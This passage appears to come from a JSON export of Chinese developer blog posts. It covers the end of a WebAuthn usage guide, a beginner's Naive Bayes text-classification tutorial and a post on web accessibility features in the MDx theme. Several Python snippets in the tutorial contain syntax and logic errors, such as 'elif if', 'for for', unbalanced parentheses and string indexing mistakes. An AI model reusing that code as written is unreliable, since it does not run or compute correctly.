与用户关联起来。至此注册完成。</p>\n<p>之后，在用户请求登录时，无需再向依赖方提供用户名。同时在传入 <code>navigator.credentials.get()</code> 的参数中也有两个需要注意：<code>userVerification</code> 必须为 \"required\"，同时 <code>allowCredentials</code> 必须为空。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\" data-enlighter-highlight=\"4-5\">navigator.credentials.get({\r\n    publicKey: {\r\n        ...\r\n        userVerification: \"required\",\r\n        allowCredentials: [],\r\n        ...\r\n    }\r\n})</pre>\n<blockquote><p>Android 暂不支持无用户名验证，空的 <code>allowCredentials</code> 会导致浏览器返回 <code>NotSupportedError</code> 错误。</p></blockquote>\n<p>此时，认证器会根据依赖方 ID 找到对应的私钥。如果有多个对应私钥，认证器会询问用户应该使用哪个身份信息登录。用户选择后，认证器就会使用对应的私钥签名挑战并将其返回。此时，<code>userHandle</code> 一定不为空。</p>\n<p>依赖方收到数据后，需要将 <code>userHandle</code> 作为用户 ID 找到对应的用户，并使用对应的公钥验证签名。如果验证成功，则认为对应的用户身份认证成功，依赖方可以允许其登录。至此验证结束。</p>\n<blockquote><p>有的时候你可能会需要清除认证器中的密钥。绝大多数认证器都提供了对应的软件以供清除存储的密钥，但大部分情况下这会重置整个认证器，这意味着相关认证器此前的所有凭证均会失效。因此建议不要将日常使用的认证器作为开发测试用的认证器。</p></blockquote>\n<h2>从 U2F 认证迁移</h2>\n<p>如果你的服务此前提供了 U2F 第二因素认证，你可能会希望在将依赖方从 U2F 升级到 WebAuthn 时用户此前注册的 U2F 认证器仍然可用而无需重新注册。由于 WebAuthn 向后兼容 U2F 设备，用户是可以继续使用原有的 U2F 认证器的。不过，由于 WebAuthn 的依赖方 ID 与 U2F 的 <code>appid</code> 并不一定相同，你需要将原有的 U2F <code>appid</code> 随 WebAuthn 流程一起传递给认证器，认证器才能使用正确的私钥进行响应。</p>\n<p>要实现这一点，我们只需要在注册及认证仪式中使用 WebAuthn 的 <code>appid</code> 扩展。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">extensions: {\r\n    appid: \"https://example.com\" //U2F appid\r\n}</pre>\n<p>此时认证器便可以得到正确的私钥，之后的流程与正常情况一致；依赖方除了正常的 WebAuthn 流程外，不需要再做任何其它操作。</p>\n<h2>拓展阅读</h2>\n<p>我们的 WebAuthn 之旅到这里就真的结束了。不过，你仍然可以自行探究，了解更多。<strong>本文只是一个粗浅的使用指南</strong>，而被称为“Web 身份认证的未来”的 WebAuthn 的深层还要很多细节值得我们挖掘学习，不过本文不会再继续讨论了。</p>\n<p>如果你想了解更多关于 WebAuthn 的信息，最好的方法是直接阅读 <a href=\"https://www.w3.org/TR/webauthn\">W3C 规范</a>。此外，Yubico 也提供了不错的 <a href=\"https://developers.yubico.com/WebAuthn/WebAuthn_Developer_Guide/\">WebAuthn 文档</a>。</p>\n<p>要了解更多认证器存储凭证的信息，你可以阅读<a href=\"https://duo.com/labs/tech-notes/how-security-keys-store-credentials\">这篇文章</a>（英文）。</p>\n<p>如果你想了解更多 Android Safety Net 是怎样运作的，可以观看<a href=\"https://youtu.be/8lv_9mydrjg\">这个视频</a>，并通过 <a href=\"https://developer.android.com/training/safetynet/attestation\">Google 的文档</a>了解 Android Safety Net 的更多信息。</p>\n<p>如果你想方便地调试 WebAuthn，<a href=\"https://webauthn.me/\">webauthn.me</a> 提供了一个非常直观方便的<a href=\"https://webauthn.me/debugger\">调试器</a>。</p>\n<h1>参考资料</h1>\n<p><a href=\"https://www.w3.org/TR/webauthn\">WebAuthn Level 1 规范 - W3C</a><br><a href=\"https://github.com/w3c/webauthn\">WebAuthn Level 2 草案 - W3C</a><br><a href=\"https://blog.techbridge.cc/2019/08/17/webauthn-intro/\">一起来了解Web Authentication - TechBridge 技术共笔部落格</a><br><a href=\"https://medium.com/@herrjemand/introduction-to-webauthn-api-5fd1fb46c285\">Introduction to WebAuthn API - Medium</a><br><a href=\"https://medium.com/@herrjemand/verifying-fido2-responses-4691288c8770\">WebAuthn/FIDO2: Verifying responses - Medium</a><br><a href=\"https://obeta.me/posts/2019-03-01/WebAuthn%E4%BB%8B%E7%BB%8D%E4%B8%8E%E4%BD%BF%E7%94%A8\">WebAuthn介绍与使用 - obeta</a><br><a href=\"https://webauthn.io/\">webauthn.io</a><br><a href=\"https://webauthn.guide/\">webauthn.guide</a><br><a href=\"https://webauthn.me/\">webauthn.me</a><br><a href=\"https://developer.mozilla.org/en-US/docs/Web/API/Web_Authentication_API/Attestation_and_Assertion\">Attestation and Assertion - MDN</a><br><a href=\"https://developer.mozilla.org/zh-CN/docs/Web/API/Web_Authentication_API\">Web Authentication API - MDN</a>（顺便翻译了一半）<br><a href=\"https://fidoalliance.org/fido-technotes-the-truth-about-attestation/\">FIDO TechNotes: The Truth about Attestation - FIDO Alliance</a><br><a href=\"https://developers.yubico.com/WebAuthn/WebAuthn_Developer_Guide/\">WebAuthn Developer Guide - Yubico</a><br><a href=\"https://en.wikipedia.org/wiki/WebAuthn\">WebAuthn - Wikipedia</a><br><a href=\"https://techcommunity.microsoft.com/t5/identity-standards-blog/all-about-fido2-ctap2-and-webauthn/ba-p/288910\">All about FIDO2, CTAP2 and WebAuthn - Microsoft Tech Community</a><br><a href=\"https://webauthn-doc.spomky-labs.com/\">Webauthn Framework</a><br><a href=\"https://zhuanlan.zhihu.com/p/25279015\">如何开发支持 FIDO U2F 登录的网站 - 知乎专栏</a><br></p></pre>\n","link":"https://flyhigher.top/develop/2160.html"},{"title":"NLP 找门：用朴素贝叶斯进行文本分类","date":"2020-01-29 11:39:58","description":"\n<blockquote>\n<p>有一天，神收到了一封垃圾邮件，于是世界上就有了朴素贝叶斯算法。</p>\n<footer>——我瞎编的</footer>\n</blockquote>\n<p>为什么这篇文章的标题是 NLP 找门呢？因为如果你看完了这篇文章，你就可以<strong>准备入门</strong>自然语言处理 (<strong>N</strong>atural <strong>L</strong>anguage <strong>P</strong>rocessing) 了。我会把这篇文章当作一篇彻彻底底的 NLP 入门文章来写，尽量避免“专业高端”词汇和“全是奇怪符号”的式子，这样<strong>只要你有高中数学基础</strong>，就能毫无压力地看完这篇文章，学会使用朴素贝叶斯分类算法分类文本。</p>\n<p>让我们开始吧。</p>\n<h1>所以，啥是朴素贝叶斯？</h1>\n<p>简单来说，朴素贝叶斯 (Naïve Bayes) <strong>是一个简单但高效的分类算法</strong>，在进行不复杂的文本分类时高效且拥有不低的准确度，判断垃圾邮件就是用朴素贝叶斯进行文本分类的一个经典例子。当然朴素贝叶斯分类不仅能用在 NLP 中，在许多分类问题中朴素贝叶斯也有非常好的效果，但我们今天只关注它在 NLP 中的应用。</p>\n<p>要了解朴素贝叶斯，我们要先来了解一下贝叶斯定理。</p>\n<blockquote>\n<p>每增加一个数学公式都会使读者减半。</p>\n<footer>——霍金</footer>\n</blockquote>\n<p>那么，就让我们先来看看贝叶斯定理的公式吧（笑</p>\n<p>$$P(A|B) = \\frac{P(AB)}{P(B)} = \\frac{P(B|A)P(A)}{P(B)}$$</p>\n<p>其实还是很简单的，运用高中的条件概率知识就能理解。本质上，贝叶斯定理给出了一种方法，使得我们可以在 \\(P(A|B)\\) 和 \\(P(B|A)\\) 之间互相转换，因为通常情况下它们是不一样的。</p>\n<p>要更好地理解，请考虑这样一个例子：</p>\n<blockquote><p>假设有一个学校图书馆，图书管理员正为找不到某本书而发愁。已知老师有 70% 的意愿借走这本书，而是学生的意愿是 30%，这个学校的师生比例是 1:10，那么借走这本书的人是老师的概率有多大？</p></blockquote>\n<p>设学校总人数为 \\(T\\)，我们可以很容易地写出这样的一个式子：</p>\n<p>$$\\begin{align} P &amp; = \\frac{T\\cdot\\frac{1}{11}\\cdot 70\\%}{T\\cdot\\frac{1}{11}\\cdot 70\\%+T\\cdot\\frac{10}{11}\\cdot 30\\%} \\\\ &amp; = \\frac{70\\%}{70\\%+10\\times30\\%} \\\\ &amp; = \\frac{7}{37} \\end{align}$$</p>\n<p>这就是贝叶斯定理了！等等，你可能会挠挠头，这哪里是贝叶斯了？别急，如果我们把最上面的式子换个字母的话…</p>\n<p>$$P(H|E) = \\frac{P(E|H)P(H)}{P(E)}$$</p>\n<p>在这里，\\(H\\) 指 Hypothesis，即假设，而 \\(E\\) 指 Evidence，即证据。这样，这个式子就很好理解了，在我们上面的例子里，借走书是证据，那么 \\(P(E)\\) 就是某个人选择借走这本书的概率；这个人是老师是假设，那么这个人是老师的概率是 \\(P(H)\\)。<strong>注意这里的概率指在学校中抽一个人是老师的概率，并不是“在借走书的前提下”这个人是老师的概率</strong>，而“在借走书的前提下”这个人是老师的概率应该是 \\(P(H|E)\\)，也正是我们要求的概率。同样地，而“这个人是老师”的前提下借走书的概率就是 \\(P(E|H)\\) 了。</p>\n<p>那么再来看看上面我们凭小学知识就列出的计算式，如果把里面的具体数据换成概率来表示的话，这个式子就会变成…</p>\n<p>$$P(H|E) = \\frac{T\\cdot P(E|H)P(H)}{T\\cdot P(E|H)P(H) + T\\cdot P(E|\\neg H)P(\\neg H)}$$</p>\n<p>好吧，这里解释一下，\\(\\neg\\) 符号表示“非”，所以 \\(P(E|\\neg H)\\) 表示在“这个人不是老师”的前提下借走书的概率。而 \\(T\\cdot P(E|H)P(H)\\) + \\(T\\cdot P(E|\\neg H)P(\\neg H)\\)，即“可能借走书的老师的数量 + 可能借走书的学生的数量”，就是“可能借走书的人的数量”了，也就是 \\(T\\cdot P(E)\\)。上下消去 \\(T\\)，我们就能得到上面的式子了。</p>\n<p>$$P(H|E) = \\frac{P(E|H)P(H)}{P(E)}$$</p>\n<p>这就是贝叶斯了定理。如果你还是不太清楚，可以去看看 3Blue1Brown 的<a href=\"https://www.bilibili.com/video/av84799361\">这个视频</a>，图形化的讲解会清晰很多。</p>\n<p>这里我要提一下这个式子里各部分的专有名称了（“专业高端”词汇警告），你可以不记住，直接看后面。</p>\n<ul>\n<li>\\(P(H|E)\\) 叫做 \\(H\\) 的<strong>后验概率</strong>，反之亦然</li>\n<li>\\(P(H)\\) 叫做 \\(H\\) 的<strong>先验概率</strong>，反之亦然</li>\n<li>特别地，我们把 \\(P(E|H)\\) 称作<strong>“似然值”</strong>，即 likelihood</li>\n</ul>\n<p>那什么是朴素贝叶斯呢？按上面所说的，朴素贝叶斯是一种分类算法。简单来说，朴素贝叶斯将一个对象的各个特征考虑为互相独立，然后根据这些特征的概率的乘积来判断对象所属的分类。基本原理如下：</p>\n<p>$$P(H|E) = \\frac{P(E|H)P(H)}{P(E)} \\propto P(E|H)P(H) = P(H)\\prod_{i}P(W_i|H)$$</p>\n<p>在这里，\\(W_i\\) 指某一对象的第 \\(i\\) 个特征，对于文本分类来说，这就是一段文本中的某个单词。</p>\n<p>朴素贝叶斯之所以“朴素”，是因为它要求<strong>各个特征间是独立的</strong>，在文本分类中也就是各个单词之间互不干扰。虽然思路简单的代价是适用范围变窄，不过由于这样的简化在很多情况下已经足够了，因此实际上朴素贝叶斯的应用范围非常广。<del>你看朴素贝叶斯 <strong>N</strong>aïve <strong>B</strong>ayes 的缩写都是 NB 了，能不厉害吗（逃</del></p>\n<h1>那么，咋分类啊</h1>\n<p>看来你这下完全听懂了呢（笑），是时候看看如何在 NLP 中应用朴素贝叶斯了。和上面一样，我们用一个具体的例子来说明。我们的目标是让电脑学会分类美国共和党和民主党的演讲稿，由于两个党派的演讲风格不同，所以这样的分类在理论上是可行的。</p>\n<div class=\"wp-block-file\">\n<a href=\"https://acdn.flyhigher.top/nlp/material.zip\" download>material.zip</a><a href=\"https://acdn.flyhigher.top/nlp/material.zip\" class=\"wp-block-file__button\" download>下载</a>\n</div>\n<p>上面我们要用到的数据集，你可以下载下来一起动手玩一玩。先说一下数据集的数据结构吧，压缩包里有两个文件，<code>train.txt</code> 将会被当作训练数据集，而 <code>test.txt</code> 则会作为训练结束后的验证数据集。两个文本文件里数据的结构是类似的，就像这样：</p>\n<pre class=\"EnlighterJSRAW\">BLUE WELL I AM SO HONORED AND PERSONALLY UNKNOWNWORD TO BE HERE...\r\nRED THANK YOU . THIS IS QUITE AN INSTITUTION . IT'S GOOD TO BE...</pre>\n<p>每行都是一篇演讲稿，每行的第一个单词指明了这篇演讲稿所属的党派，<code>RED</code> 指共和党，而 <code>BLUE</code> 指民主党。所有单词和符号都已经被转为大写并由空格分隔方便处理。<code>train.txt</code> 有共和党演讲稿和民主党演讲稿各 23 篇，<code>test.txt</code> 有 6 篇共和党演讲稿，12 篇民主党演讲稿。</p>\n<p>明白了？那我们就开始吧。</p>\n<h2>捋捋思路</h2>\n<p>首先，我们需要考虑如何在文本分类中应用朴素贝叶斯。很简单，按朴素贝叶斯的思路，<strong>计算每个词在某一分类下的出现概率，然后将某篇文章的所有词的概率相乘，再乘以该分类的先验概率，就可以得到某篇文章在某一分类下的概率。</strong></p>\n<p>$$P(Class|Article) = P(Class)\\prod_{i}P(Word_i|Class)$$</p>\n<p>各个分类概率都计算完成后，概率最高的那个分类就是这篇文章可能所属的分类。这个思路的核心就是用词决定了文本风格，文本的不同类别用词会有差异，只要能量化这些差异就可以分类文本。在我们的例子中，我们可以从 <code>train.txt</code> 中统计各个词汇的出现情况，然后用 <code>test.txt</code> 中的数据按上面的算法验证我们算法的准确性。</p>\n<p>这个思路很简单也很清晰，但还有一些问题需要解决。<strong>第一，有的时候，我们的测试数据集中可能会出现一个在训练数据集中没有出现过的词语。这个时候，朴素贝叶斯的计算结果会是 0。</strong>如果我们把 0 乘进式子中，那就别想得到正常的结果了。所以，我们还需要对计算某一单词在某一分类中的式子稍加改进。使用拉普拉斯平滑，就可以避免出现概率为 0 的情况。别被名字吓到，拉普拉斯平滑是一种非常简单的平滑方法：在分子上 +1，在分母上加整个取值范围，这样就可以给整个分式加上非常微小的偏移，避免出现 0。</p>\n<p>$$\\begin{align} P(Word_i|Class) &amp; = \\frac{Word_iCountInClass}{AllWordCountInClass} \\\\ &amp; \\approx \\frac{Word_iCountInClass + 1}{AllWordCountInClass + UniqueWordCount} \\end{align}$$</p>\n<p><strong>第二，对于长文本，大部分词语在某一分类中的出现概率是远小于 1 的，加上长文本词汇量大，往往概率相乘的结果会非常小。</strong>受限于计算机处理浮点数的原理，精确处理这么小的数字是很麻烦的。幸好，运用一些简单的数学知识就可以将其转化为更精确的表达，<strong>那就是取对数。</strong></p>\n<p>首先，将概率计算结果取对数并不影响我们的计算结果。因为取对数是一个单调递增的操作，而我们计算概率只是为了排序选择概率最高的分类，因此取对数是不影响我们排序的。而把多项式取对数，等于把多项式的每一项取对数后相加。所以我们有：</p>\n<p>$$\\lg{\\Big(P(Class)\\prod_{i}P(Word_i|Class)\\Big)} = \\lg{P(Class)} + \\sum_i\\lg{P(Word_i|Class)}$$</p>\n<p>大部分情况下，在每一次取对数的时候，要取对数的数字的大小，即 \\(P(Word_i|Class)\\) 尚还在计算机能处理的范围内，<strong>因此我们可以放心地使用取对数的方法</strong>，避免计算机精度不够影响结果。</p>\n<p><strong>第三就是在某些情况下，可能会有部分词语干扰计算结果</strong>，如 and, is 这类的被大量使用的中性词。如果希望得到更好的结果，我们可以维护一个停用词表，在计算时排除停用词即可。或者，我们可以在计算完每个单词的出现数量后，排除数量最多的前 \\(N\\) 个单词，避免这些单词过多地影响计算。</p>\n<h2>写点代码</h2>\n<p>现在我们终于可以开始实战，写点代码了。我会用简单的 Python 来表达思路。好了，理一理思绪，第一步我们要做的，是统计训练数据集中的用词情况。具体来说，根据上面的思考，我们需要统计的有：</p>\n<ul>\n<li>每个单词在各分类中出现的数量</li>\n<li>各分类中的不重复词数量</li>\n</ul>\n<p>用 Python 简单表示如下：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"python\">#读入数据过程略...\r\ndata_raw = \"读入的数据\".split('\\n') #按行分隔\r\ndata_blue = []\r\ndata_red = []\r\nword_count_blue = {}\r\nword_count_red = {}\r\n\r\nfor line_data in data_raw:\r\n    word_list = line_data.split(\" \") #分隔单词\r\n    if word_list[0] == \"BLUE\":\r\n        for i in range(1,len(word_list)):\r\n            if not is_excluded(word_list[i]): #判断是否为停用词\r\n                data_blue.append(word_list[i])\r\n                #统计单词出现次数\r\n                word_count_blue.setdefault(word_list[i], 0)\r\n                word_count_blue[word_list[i]] += 1\r\n    elif if word_list[0] == \"RED\":\r\n        #Class = red 时同理...\r\n\r\n#统计非重复词\r\nunique_words_blue = list(set(data_blue))\r\nunique_words_red = list(set(data_red))</pre>\n<p>训练过程到这里就结束了，计算机已经知道了各政党演讲的用词习惯。很简单吧？接下来我们就要使用测试数据集来测试准确度了。<strong>这里开始就涉及到朴素贝叶斯的计算了</strong>，可能会稍微复杂一点点。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"python\">import math\r\n#读入测试数据过程略...\r\ntest_data_raw = \"读入的数据\".split('\\n') #按行分隔\r\ntest_data = []\r\n\r\nfor for line_data in test_data_raw:\r\n    if line_data[0] == \"BLUE\":\r\n        content_data = line_data.split(\" \").pop(0)\r\n        test_data.append({\"class\": \"blue\", \"content\": content_data})\r\n\r\nfor line_data in test_data:\r\n    if line_data[\"class\"] == 'blue':\r\n        posibility_blue = 0\r\n        for word in line_data[\"content\"]:\r\n            #计算各单词概率，取对数后相加，使用了拉普拉斯平滑\r\n            if word in word_count_blue:\r\n                posibility_blue += math.log((word_count_blue[word]+1)/(len(data_blue)+len(unique_words_blue)+len(unique_words_red)))\r\n            else:\r\n                posibility_blue += math.log(1/(len(data_blue)+len(unique_words_blue)+len(unique_words_red)))\r\n        #最后加上该分类概率的对数\r\n        posibility_blue += math.log(len(data_blue/((len(data_blue)+(len(data_red)))\r\n    elif line_data[\"class\"] == 'red':\r\n        #Class = red 时同理...</pre>\n<p>计算完成后，我们就得到每篇演讲稿在各分类下的概率了。之后，简单的比较就能得出推断的分类：如果 \\(P(Red|Article)\\) 大于 \\(P(Blue|Article)\\)，那么这篇演讲稿就更可能是共和党的演讲稿，反之则是民主党的演讲稿。</p>\n<p>很好理解吧？那么这么简单的思路，准确性怎么样呢？对于我们的例子，这是我设置了个别停用词后的结果：</p>\n<pre class=\"EnlighterJSRAW\">+-----+-------+--------------+--------------+-------+-------+\r\n|   ID|  Class|        P(Red)|       P(Blue)|  Guess| Status|\r\n+-----+-------+--------------+--------------+-------+-------+\r\n|    1|   Blue|  -23204.68377|  -22998.67066|   Blue|      √|\r\n|    2|   Blue|  -16438.44625|  -16137.48257|   Blue|      √|\r\n|    3|   Blue|  -33468.81214|  -32567.61801|   Blue|      √|\r\n|    4|   Blue|    -8606.2193|   -8601.50426|   Blue|      √|\r\n|    5|   Blue|  -12430.97436|  -11935.70662|   Blue|      √|\r\n|    6|   Blue|  -44033.02883|  -43877.55367|   Blue|      √|\r\n|    7|   Blue|   -16947.2851|  -16758.57542|   Blue|      √|\r\n|    8|   Blue|  -26957.26997|  -26889.62444|   Blue|      √|\r\n|    9|   Blue|  -27503.73985|  -27249.21828|   Blue|      √|\r\n|   10|   Blue|   -20528.4457|   -19991.1248|   Blue|      √|\r\n|   11|   Blue|  -20337.96493|  -19860.12831|   Blue|      √|\r\n|   12|   Blue|  -28409.28489|  -28118.98017|   Blue|      √|\r\n|   13|    Red|  -13756.01015|  -14488.11751|    Red|      √|\r\n|   14|    Red|  -17221.22732|  -17710.15936|    Red|      √|\r\n|   15|    Red|  -17397.45136|  -17899.98659|    Red|      √|\r\n|   16|    Red|  -10724.69095|  -11092.77837|    Red|      √|\r\n|   17|    Red|  -10402.40027|  -10859.48681|    Red|      √|\r\n|   18|    Red|   -9371.53792|    -9669.6769|    Red|      √|\r\n+-----+-------+--------------+--------------+-------+-------+\r\n|                                      Total: 18/18, 100.0% |\r\n+-----------------------------------------------------------+</pre>\n<p><strong>100% 的准确率哦！</strong>事实上，对于我们的这个例子，就算不设置停用词，我们仍能达到 100% 的分类准确率。朴素贝叶斯分类的确很 NB 呢。</p>\n<h1>更进一步</h1>\n<p>我们的探索到这里就结束了，但如果你有兴趣，完全可以继续探索下去。我们的例子是一个非常简化的例子，在实际情况中，还有很多问题需要解决。比如，对于中文及类似语言，不存在拉丁语系的天然分词结构，而朴素贝叶斯的文本分类是基于单词的，那么<strong>中文的分词就会是个问题；</strong>再比如，对于朴素贝叶斯分类来说，<strong>词语之间的顺序是不影响分类结果的</strong>，但这就会导致“今天心情很好，但昨天不好”和“昨天心情很好，但今天不好”在朴素贝叶斯看来是一样的，要想获得更好的结果，我们必须<strong>考虑词语的顺序。</strong></p>\n<p>这些问题，今天我们就不再深究了，但你可以自己探索。比如，引入思路同样很简洁的马尔科夫链，我们就可以让计算机学会考虑词语间的顺序，不过那就会是另一个话题了。</p>\n","link":"https://flyhigher.top/develop/1989.html"},{"title":"MDx 中增强页面可访问性的细节","date":"2020-01-25 16:45:04","description":"\n<blockquote><p>这篇文章本来是打算发在 <a href=\"https://mdxblog.flyhigher.top/\">MDx Blog</a> 的，不过写到后来发现这篇文章相对来说还是有价值的，于是就将这篇文章转移到了无垠，MDx Blog 则不再发表这篇文章。</p></blockquote>\n<p>从 MDx 开发之初，增强页面的可访问性就被列为了一个重要目标。从 HTML 语义化，到 ARIA 地标，再到 <code>prefers-reduced-motion</code>，随着浏览器对于增强页面可访问性的支持功能越来越多，MDx 也在不断地更新，让更多的人都能毫无困难地浏览、查看由 MDx 渲染的网页。本文会详细说明一些 MDx 中增强页面可访问性的细节，<strong>如果你希望增强自己开发的网页的可访问性，本文可能会对你有所帮助。</strong></p>\n<h1>基础性增强</h1>\n<p>增强可访问性，最重要也是最基础的一点就是 HTML 语义化。通过使用 HTML 5 语义化标签和 ARIA Role 标签，我们可以很方便地<strong>将整个网页在语义上分为几部分，而这将有效地改善屏幕阅读器对网页的分析质量，使视力障碍用户更好地浏览网页。</strong></p>\n<h2>HTML 语义化</h2>\n<p><strong>HTML 语义化属于增强页面可访问性的基础中的基础。</strong>通过使用语义化的 HTML 标签，我们可以方便地为网页中的各部分标记功能而不影响页面样式。随着符合 HTML 5 的现代化网页成为主流，语义化标签已被很大一部分网站所支持，我也不过多赘述了。就举几个常用的“地标性”标签吧：</p>\n<ul>\n<li>\n<code>header</code> 标签标记页眉，默认样式同 <code>div</code>，不要把它和 <code>head</code> 搞混了</li>\n<li>\n<code>main</code> 标签标记页面的主要内容，默认样式同 <code>div</code>\n</li>\n<li>\n<code>article</code> 标签标记文章（在 HTML 5 中它指任何独立或可复用的文本），默认样式同 <code>div</code>\n</li>\n<li>\n<code>footer</code> 标签标记页脚，默认样式同 <code>div</code>\n</li>\n<li>\n<code>nav</code> 标签标记页面导航栏区域，默认样式同 <code>div</code>\n</li>\n<li>\n<code>aside</code> 标签标记侧栏，默认样式同 <code>div</code>\n</li>\n<li>\n<code>section</code> 标签标记“一组内容”，你可以把它看作是划定网页中一块区域的通用标签，默认样式同 <code>div</code>\n</li>\n</ul>\n<p>只要用这些标签替代 <code>div</code> 而不是无脑使用 <code>div</code> 就能提高页面的可访问性。MDx 使用了这些标签来增强页面的可访问性。</p>\n<h2>下一步，ARIA</h2>\n<p>有的时候，出于一些原因，我们没法使用语义化的 HTML 标签，或者没有合适的语义化标签来标记内容，这时候<strong>我们就需要使用 ARIA (Accessible Rich Internet Applications，可访问的富互联网应用)。</strong>ARIA 的基础用法很简单，只要在相应元素上加上 <code>role</code> 属性指定该元素的功能即可。下面是一个简单的例子：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"html\">&lt;div role=\"navigation\"&gt;\r\n  &lt;ul&gt;\r\n    &lt;li&gt;&lt;a href=\"#\"&gt;Page A&lt;/a&gt;&lt;/li&gt;\r\n    &lt;li&gt;&lt;a href=\"#\"&gt;Page B&lt;/li&gt;\r\n    &lt;li&gt;&lt;a href=\"#\"&gt;Page C&lt;/a&gt;&lt;/li&gt;\r\n  &lt;/ul&gt;\r\n&lt;/div&gt;</pre>\n<p>通过 <code>role=\"navigation\"</code>，我们把一个 <code>div</code> 标记为了导航栏区域。实际上，对屏幕阅读器来说，这和 <code>nav</code> 标签在语义上是一致的。上一节中的例子都可以分别用以下 ARIA Role 表示：</p>\n<ul>\n<li><code>role=\"heading\"</code></li>\n<li><code>role=\"main\"</code></li>\n<li><code>role=\"article\"</code></li>\n<li><code>role=\"contentinfo\"</code></li>\n<li><code>role=\"navigation\"</code></li>\n<li><code>role=\"complementary\"</code></li>\n<li><code>role=\"region\"</code></li>\n</ul>\n<p>除此以外，MDx 还使用了 <code>role=\"banner\"</code> 和 <code>role=\"search\"</code> 来分别标记页面中的顶部栏和搜索表单。另外，<strong>有的时候 <code>role</code> 属性还需配合 <code>aria-*</code> 属性一同使用</strong>，具体规则比较复杂，我就不在这里赘述了，具体可参考 <a href=\"https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Roles\">WAI-ARIA Roles – MDN</a>。</p>\n<h1>媒体查询来帮忙</h1>\n<p>CSS 的媒体查询其实是一个非常强大的特性，<strong>妥善利用其中的一些特性，我们可以在网页外观上大大增强网页的可访问性。</strong>除了已经烂大街的“对浏览器窗口大小”响应的媒体查询，我会介绍 3 个很少有网站充分利用的媒体查询。</p>\n<h2>print</h2>\n<p><code>print</code> 媒体查询其实已经“历史悠久”了，<strong>只要使用 <code>@media print {...}</code> 就可以创建只在打印页面时生效的样式。</strong>通过这种方式，我们可以让页面在打印时应用一套为打印优化的样式，增强页面在物理纸张上的可访问性。</p>\n<blockquote><p>维基百科是对打印样式做了单独适配的著名例子。</p></blockquote>\n<p><strong>由于在打印的情况下，页面已经离开了“可交互”的范围，还有分页这种在屏幕中无需考虑的问题，要让页面在物理纸张上仍能被轻松地阅读，我们需要做一些特殊的适配。</strong>直接来看一个例子吧。以下是 MDx 针对打印情况进行的一些特殊优化，样式的具体理由已经写在了注释中。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"css\">@media print {\r\n    /*隐藏不必要的元素*/\r\n    header, .mdx-ad-after-article, .mdx-ad-in-article, .mdx-post-money, .page-footer-nav, .mdx-same-posts, .spanout button, .mdui-drawer, .mdui-overlay, .mdui-menu, .mdx-share-img-dialog, .mdx-share-wechat-dialog {\r\n        display: none!important;\r\n    }\r\n\r\n    /*使用下划线标记链接*/\r\n    article a {\r\n        text-decoration: underline!important;\r\n    }\r\n    /*由于纸张不可交互，在链接后显示链接到的 URL*/\r\n    article a::after {\r\n        content: \"(\" attr(href) \")\";\r\n    }\r\n\r\n    /*强制白底黑字*/\r\n    html &gt; body {\r\n        background-color: white!important;\r\n    }\r\n    article p {\r\n        color: rgba(0,0,0,.8)!important;\r\n    }\r\n\r\n    /*对于纸张上的长文章，衬线字体拥有更好的可读性。以下字体列表来自 fonts.css*/\r\n    article {\r\n        font: 13pt Georgia, \"Nimbus Roman No9 L\", \"Songti SC\", \"Noto Serif CJK SC\", \"Source Han Serif SC\", \"Source Han Serif CN\", STSong, \"AR PL New Sung\", \"AR PL SungtiL GB\", NSimSun, SimSun, \"TW\\-Sung\", \"WenQuanYi Bitmap Song\", \"AR PL UMing CN\", \"AR PL UMing HK\", \"AR PL UMing TW\", \"AR PL UMing TW MBE\", PMingLiU, MingLiU, serif!important;\r\n    }\r\n\r\n    /*除部分元素外，禁止在元素内部分页*/\r\n    * {\r\n        page-break-inside: avoid;\r\n    }\r\n    article p, article a, #comments, article {\r\n        page-break-inside: auto;\r\n    }\r\n}</pre>\n<p>MDx 自 1.9.3 版本起已经包含了对文章页的打印样式优化。可以很容易地看出，优化后的样式在物理纸张上将更容易阅读。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/6.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/6.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"1345\" height=\"1602\" class=\"aligncenter size-full wp-image-1959\"></a>\n<h2>prefers-color-scheme</h2>\n<p><code>prefers-color-scheme</code> 是最近才被浏览器广泛支持的一个媒体查询，但它的功能却很强大：<strong>响应系统级黑暗模式。</strong>这样，我们可以在开启黑暗模式的系统中让网页具有更好的可读性。不过由于这个媒体查询直到最近才被广泛支持，因此大部分网站对此并没有进行适配。</p>\n<blockquote><p>一些适配这一特性的网站：少数派、微信公众平台（文章页）等。</p></blockquote>\n<p>通过像这样的媒体查询，我们可以在系统启用黑暗模式时让页面实时响应：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"css\">@media (prefers-color-scheme: dark) {\r\n    body {\r\n        background-color: #212121;\r\n        color: rgba(255, 255, 255, .7);\r\n    }\r\n}</pre>\n<p><code>prefers-color-scheme</code> 一共有 3 个可能值：<code>no-preference</code>, <code>light</code> 和 <code>dark</code>。你也可以不像上面的例子那样默认使用亮色样式并在黑暗模式下启用黑暗样式，而可以反过来将黑暗样式作为默认，用亮色样式覆盖。在不支持的浏览器上将会显示默认样式（即媒体查询不会生效）。</p>\n<p>MDx 已经在 1.9.6 版本中包含对这一媒体查询的支持。</p>\n<h2>prefers-reduced-motion</h2>\n<p>看名字就猜得出，<code>prefers-reduced-motion</code> 是和 <code>prefers-color-scheme</code> 师出同门的媒体查询。因此，和 <code>prefers-color-scheme</code> 一样，它也是在最近才获得了浏览器的广泛支持。它的作用也很强大：<strong>响应系统的“减弱动态效果”模式。</strong>这对某些不喜欢甚至无法接受动画的用户可能很有帮助。要知道，对有些用户来说这甚至是医疗上的必要。使用如下的媒体查询，我们可以在系统启用减弱动态效果模式时让页面实时响应，减弱动画：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"css\">@media (prefers-reduced-motion: reduce) {\r\n    /*只是一个示例，实际情况中可以保留一些淡入淡出效果*/\r\n    * {\r\n        transition: all 0s!important;\r\n        transform: none!important;\r\n    